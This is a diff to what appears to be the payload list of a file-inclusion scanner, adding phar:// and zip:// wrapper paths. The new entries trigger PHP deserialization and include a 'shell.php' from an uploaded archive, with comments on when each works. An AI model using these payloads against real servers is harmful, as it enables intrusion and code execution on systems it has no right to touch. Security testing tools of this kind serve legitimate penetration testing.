@@ -18,6 +18,20 @@ absolute_files:
     flags: rxP
     unix: true
     windows: true
+  # phar:// wrapper — triggers deserialization when LFI uses non-executing functions
+  # (file_get_contents, fopen, file_exists, etc). Requires a .phar file to already
+  # exist on the target filesystem (uploaded or writable).
+  - path: "phar://uploaded_file.jpg"
+    find: ""
+    flags: rR
+    unix: true
+    windows: true
+  # zip:// wrapper — include PHP from inside a zip archive uploaded to the target
+  - path: "zip:///tmp/uploaded.zip%23shell.php"
+    find: ""
+    flags: rR
+    unix: true
+    windows: false
 
 remote_files:
   - path: "http://www.tha-imax.de/fimap_testfiles/test"
